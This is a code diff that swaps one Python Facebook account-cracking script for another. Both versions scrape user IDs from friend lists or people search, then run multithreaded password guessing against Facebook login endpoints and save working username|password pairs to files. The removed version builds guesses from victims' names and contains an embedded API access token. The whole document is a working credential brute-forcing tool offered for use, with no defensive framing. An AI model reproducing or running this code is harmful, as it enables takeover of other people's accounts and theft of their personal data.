@@ -1,243 +1,95 @@
-# coding=utf-8
-# Coded By DulLah
+import requests,bs4,sys,os
+import requests,sys
+from multiprocessing.pool import ThreadPool
 
-class Brute(object):
+class crack:
 	def __init__(self):
-		self.id = []
-		self.session = requests.session()
-		self.url = "https://mbasic.facebook.com{0}"
-		self.loop = 0
-		self.cekpoin = []
-		self.ok = []
-	
-	def init(self, cookie):
-		data = {}
-		hd = {
-		"User-Agent" : "Mozilla/5.0 (Linux; Android 7.0; Redmi Note 4 Build/NRD90M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.137 Mobile Safari/537.36",
-		"Cookie" : str(cookie)}
-		cookies = {
-		"Cookie " : str(cookie)}
-		data["ua"] = hd
-		data["cookie"] = cookies
-		return data
-	
-	def logo(self, x, bottom):
-		logo = ("""
-  \033[1;96m __  ___     ____  _   ___  ____
-  /  |/  /_ __/ / /_(_) / _ )/ __/ \033[0m|| Created By DulLah\033[1;96m
- / /|_/ / // / / __/ / / _  / _/   \033[0m|| Github.com/dz-id\033[1;96m
-/_/  /_/\_,_/_/\__/_/ /____/_/\033[0m     || FB.me/dulahz
-________________________________________________________
-
-%s%s """%(x.upper(), bottom))
-		return logo
-	
-	def login(self):
-		print(self.logo("",""))
-		print("\033[1;96mLogin with your facebook cookies first\n")
-		cookie = str(raw_input("\033[1;96m[*] \033[0mCookie : "))
-		self.data = self.init(cookie)
-		
-		content = self.session.request(
-			"GET", "https://mbasic.facebook.com/profile.php",
-				headers = self.data["ua"], cookies = self.data["cookie"]
-		).text
-		if ("logout.php" in str(content.encode("utf-8"))):
-			main.comments(self, self.data["ua"], self.data["cookie"])
-			main.bahasa(self, self.data["ua"], self.data["cookie"])
-			open("cookie.log", "w").write(cookie.encode("utf-8"))
-			self.main()
-		else:
-			print("\033[1;91m[*] \033[0mWrong cookies")
-			time.sleep(2)
-			self.login()
-			exit()
-		
-	def main(self):
+		self.ada=[]
+		self.cp=[]
+		self.ko=0
 		try:
-			cookie = open("cookie.log").read()
-			self.data = self.init(cookie)
+			self.fl=open(raw_input("?: id list file: ")).read().splitlines()
+		except Exception as e:
+			print "!: %s"%e
+			crack()
+		print "+ example pass123,pass12345"
+		self.pwlist()
+		
+	def pwlist(self):
+		self.pw=raw_input("?: password list: ").split(",")
+		if len(self.pw) ==0:
+			self.pwlist()
+		else:
+			print "!: crack started..."
+			print "+: account found saved to: multiresult.txt"
+			print "+: account checkpoint saved to: checkpoint.txt"
+			ThreadPool(30).map(self.main,self.fl)
+			exit("\n+: finished.")
+		
+	def main(self,fl):
+		try:
+			for i in self.pw:
+				r=requests.Session()
+				r.get("https://mbasic.facebook.com/login")
+				r.headers.update({"User-Agent":"Mozilla/5.0 (Linux; Android 7.1.2; Redmi 4X) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.132 Mobile Safari/537.36"})
+				b=r.post("https://mbasic.facebook.com/login", data={"email":fl,"pass":i}).url
+				if "c_user" in r.cookies.get_dict():
+					self.ada.append("%s|%s"%(fl,i))
+					open("multiresult.txt","a+").write("%s|%s\n"%(fl,i))
+				if "checkpoint" in b:
+					self.cp.append("%s|%s"%(fl,i))
+					open("checkpoint.txt","a+").write("%s|%s\n"%(fl,i))
+			self.ko+=1
+			print "\r[Crack] %s/%s - found-:%s - cp-:%s"%(self.ko,len(self.fl),len(self.ada),len(self.cp)),;sys.stdout.flush()
+		except:
+			self.main(fl)
 			
-			content = self.session.request(
-				"GET", "https://mbasic.facebook.com/profile.php",
-					headers = self.data["ua"], cookies = self.data["cookie"]
-			).text
-			bs = BeautifulSoup(content, "html.parser")
-			if ("logout.php" in str(bs)):
-				print(self.logo("user : "+bs.title.text, "\n________________________________________________________"))
-				self.menu()
+def search(fl,r,b):
+	open(fl,"a+")
+	b=bs4.BeautifulSoup(r.get(b).text,"html.parser")
+	for i in b.find_all("a",href=True):
+		print "\r[GET]: %s id..."%(len(open(fl).read().splitlines())),;sys.stdout.flush()
+		if "<img alt=" in str(i):
+			if "home.php" in str(i["href"]):
+				continue
 			else:
-				os.remove("cookie.log")
-				self.login()
-		except IOError:
-			self.login()
-	
-	def menu(self):
-		print("""
-\033[1;96m(•) \033[0m01. Friends Lists
-\033[1;96m(•) \033[0m02. Friends
-\033[1;96m(•) \033[0m00. Remove Cookie\n""")
-		choice = int(raw_input("\033[1;96m[*] \033[0mEnter your choice >> "))
-		if (choice == 1):
-			print("")
-			self.type = 1
-			url = self.url.format("/friends/center/friends/")
-			self.grabId(url)
-		elif (choice == 2):
-			print("\n\033[1;91m(?) Note : use mbasic")
-			url = raw_input("\n\033[1;96m[*]\033[0m Enter friends lists url : ")
-			self.type = 2
-			self.grabId(url)
-		elif (choice == 0):
-			os.remove("cookie.log")
-			self.login()
-		else:
-			exit("\n\033[1;91m[!] \033[0mLiat menu dong.")
-			
-	def grabId(self, url):
-		content = self.session.request(
-			"GET", url,
-				headers = self.data["ua"], cookies = self.data["cookie"]
-		).text
-		bs = BeautifulSoup(content, "html.parser")
-		if (self.type == 1):
-			for x in bs.findAll(style="vertical-align: middle"):
-				find = x.find("a")
-				if "None" in str(find) or "+" in str(find):
-					continue
+				g=str(i["href"])
+				if "profile.php" in g:
+					d=bs4.re.findall("/profile\.php\?id=(.*?)&",g)
+					if len (d) !=0:
+						pk="".join(d)
+						open(fl,"a+").write("%s\n"%(pk))
 				else:
-					id = re.findall("/?uid=(.*?)&", find["href"])
-					ids = id[0]+"_"+find.text.replace(" ", "_")
-					self.id.append(ids)
-					
-				sys.stdout.write(
-					"\r\033[1;96m[*] \033[0m[\033[1;91m{0}\033[0m] {1} Getting id ".format(
-						len(self.id), id[0]
-				)) ; sys.stdout.flush()
-		else:
-			for x in bs.findAll(style="vertical-align: middle"):
-				find = x.find("a")
-				if "None" in str(find) or "+" in str(find):
-					continue
-				else:
-					if ('/profile.php?id=' in str(find)):
-						id = re.findall("/?id=(.*?)&",find["href"])
-						ids = id[0]+"_"+find.text.replace(" ", "_")
-						self.id.append(ids)
-					else:
-						id = re.findall("/(.*?)\?fref=",find["href"])
-						ids = id[0]+"_"+find.text.replace(" ", "_")
-						self.id.append(ids)
-						
-				sys.stdout.write(
-					"\r\033[1;96m[*] \033[0m[\033[1;91m{0}\033[0m] Getting id ".format(
-						len(self.id), id[0]
-				)) ; sys.stdout.flush()
-			
-		if ("Lihat selengkapnya" in str(bs)):
-			next = bs.find("a", string="Lihat selengkapnya")["href"]
-			self.grabId(self.url.format(next))
-		elif ("Lihat Teman Lain" in str(bs)):
-			next = bs.find("a", string="Lihat Teman Lain")["href"]
-			self.grabId(self.url.format(next))
-		else:
-			print("")
-			ThreadPool(30).map(self.crack, self.id)
-			self.results(self.ok, self.cekpoin)
-			exit()
-	
-	def users(self, user):
-		users = user.split("_")
-		if (len(users) == 2):
-			pasw = [
-				users[1]+"123",
-				users[1]+"1234",
-			]
-		elif (len(users) == 3):
-			pasw = [
-				users[1]+"123",
-				users[1]+"1234",
-				users[2]+"123",
-				users[2]+"1234",
-				users[3]+"1234",
-				users[3]+"12345",
-				users[4]+"12345",
-				users[4]+"123456",
-				users[5]+"123456",
-				users[5]+"1234567",
-				users[6]+"1234567",
-				users[6]+"12345678",
-				users[7]+"123456789",
-				users[7]+"1234567890",
-			
-			]
-		elif (len(users) == 4):
-			pasw = [
-				users[1]+"123",
-				users[1]+"1234",
-				users[2]+"123",
-				users[2]+"1234",
-				users[3]+"123",
-				users[3]+"1234",
-			]
-		else:
-			pasw = [
-				'sayang', 'sayangku',
-				'ILOVEYOU','ILoveYou',
-				'iloveyou', 'cintaku',
-				'munafik', 'mylove',
-				'mylove123', 'cintaku',
-			]
-		return pasw
-	
-	def results(self, ok, cp):
-		if (len(ok) !=0):
-			print("\n\n\033[1;96m[*] \033[0mFound : %s"%(len(ok)))
-			for x in ok: print("\033[1;92m"+x)
-			print("\033[1;96m[*] \033[0mSaved : ok.txt")
-		if (len(cp) !=0):
-			print("\n\n\033[1;96m[*] \033[0mCekpoint : %s"%(len(cp)))
-			for x in cp: print("\033[1;93m"+x)
-			print("\033[1;96m[*] \033[0mSaved : cp.txt")
-		if (len(ok) == 0 and len(cp) == 0):
-			print("\n\n\033[1;91m[!] \033[0mNo results Found :(")
-			
-	def crack(self, user):
-		try:
-			self.loop+=1
-			pw = self.users(user)
-			for i in pw:
-				username = user.split("_")[0].lower()
-				password = i.lower()
-				url = "https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+username+"&locale=en_US&password="+password+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6"
-				req = requests.request(
-					"GET", url
-				).json()
-				try:
-					if "www.facebook.com" in req["error_msg"]:
-						self.cekpoin.append(username+"|"+password)
-						open("cp.txt","a").write(str(username)+"|"+str(password)+"\n")
-						break
-				except:
-					try:
-						req["access_token"]
-						self.ok.append(username+"|"+password)
-						open("ok.txt","a").write(str(username)+"|"+str(password)+"\n")
-						break
-					except: pass
-			
-			sys.stdout.write(
-				"\r\033[1;96m[*] \033[0mCracking %s/%s Ok:-%s Cp:-%s "%(
-					self.loop, len(self.id), len(self.ok), len(self.cekpoin)
-				)
-			) ; sys.stdout.flush()
-		except: pass
+					d=bs4.re.findall("/(.*?)\?",g)
+					if len(d) !=0:
+						pk="".join(d)
+						open(fl,"a+").write("%s\n"%(pk))
+		if "Lihat Hasil Selanjutnya" in i.text:
+			search(fl,r,i["href"])
+	print "\n[+] finished."
+				
 
-try:
-	import requests, os, re, time, sys, hashlib
-	from data import main
-	from bs4 import BeautifulSoup
-	from multiprocessing.pool import ThreadPool
-	Brute().main()
-except Exception as E:
-	exit("\n\033[1;91m[*] \033[0mError : "+str(E))
+def dumpfl():
+	r=requests.Session()
+	r.get("https://mbasic.facebook.com/login")
+	r.headers.update({"User-Agent":"Mozilla/5.0 (Linux; Android 7.1.2; Redmi 4X) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.132 Mobile Safari/537.36"})
+	r.post("https://mbasic.facebook.com/login", data={"email":raw_input("?: email: "),"pass":raw_input("?: passs: ")}).url
+	if "c_user" in r.cookies.get_dict():
+		fl=raw_input("?: filename: ")
+		s=raw_input("?: search query: ")
+		search(fl,r,"https://mbasic.facebook.com/search/people/?q="+s)
+	
+
+
+while True:
+	print "[1] Dump id By Search Name"
+	print "[2] Crack\n"
+	r=raw_input("?: pilih: ")
+	if r=="":
+		os.system("clear")
+	elif r =="1":
+		dumpfl()
+	elif r=="2":
+		crack()
+	else:
+		print "!: wrong input"
